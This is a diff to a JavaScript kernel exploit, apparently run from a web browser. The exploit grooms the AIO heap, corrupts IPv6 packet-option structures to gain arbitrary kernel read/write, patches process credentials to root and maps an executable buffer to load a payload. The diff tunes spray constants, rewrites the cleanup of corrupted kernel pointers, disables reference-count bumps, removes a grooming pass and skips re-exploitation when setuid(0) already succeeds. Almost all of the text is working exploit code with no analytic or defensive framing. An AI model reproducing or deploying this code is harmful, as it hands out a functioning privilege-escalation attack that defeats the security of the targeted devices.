@@ -133,7 +133,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 40;
+const num_alias = 10;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
@@ -141,6 +141,7 @@ const num_clobbers = 8;
 
 let chain = null;
 var nogc = [];
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1458,28 +1459,23 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
     log('achieved arbitrary kernel read/write');
 
-    // RESTORE: clean corrupt pointers
-    // pktopts.ip6po_rthdr = NULL
-    const off_ip6po_rthdr = 0x68;
-    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
+    // RESTORE: clean corrupt pointer
+     // pktopts.ip6po_rthdr = NULL
+     //ABC Patch
+     const off_ip6po_rthdr = 0x68;
+     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
-    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    log(kmem.read64(w_rthdr_p));
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
-    log('corrupt pointers cleaned');
-
-    
+    /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1601,6 +1597,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     alert("kernel exploit succeeded!");
 }
 
+
+
 // FUNCTIONS FOR STAGE: SETUP
 
 function setup(block_fd) {
@@ -1640,18 +1638,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);
-    {
-        // chosen to maximize the number of 0x100 malloc allocs per submission
-        const num_reqs = 4;
-        const groom_ids = new View4(num_grooms);
-        const groom_ids_p = groom_ids.addr;
-        const greqs = make_reqs1(num_reqs);
-        // allocate enough so that we start allocating from a newly created slab
-        spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-        cancel_aios(groom_ids_p, num_grooms);
-    }
-        
+    cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
 
@@ -1670,6 +1657,15 @@ export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
+
+    // If setuid is successful, we dont need to run the kexploit again
+    try {
+        if (sysi('setuid', 0) == 0) {
+            log("Not running kexploit again.")
+            return;
+        }
+    }
+    catch (e) {}
 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1724,6 +1720,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
+        
     } finally {
         close(unblock_fd);
 
@@ -1745,8 +1742,7 @@ export async function kexploit() {
     }
 }
 
-kexploit().then(() => {
-    function malloc(sz) {
+function malloc(sz) {
         var backing = new Uint8Array(0x10000 + sz);
         nogc.push(backing);
         var ptr = mem.readp(mem.addrof(backing).add(0x10));
@@ -1761,6 +1757,10 @@ kexploit().then(() => {
         ptr.backing = new Uint32Array(backing.buffer);
         return ptr;
     }
+
+
+kexploit().then(() => {
+    
     window.pld_size = new Int(0x26200000, 0x9);
 
     var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
@@ -1781,4 +1781,9 @@ kexploit().then(() => {
         payload_loader,
         payload_buffer,
     );
+
+
+    
+
+
 })
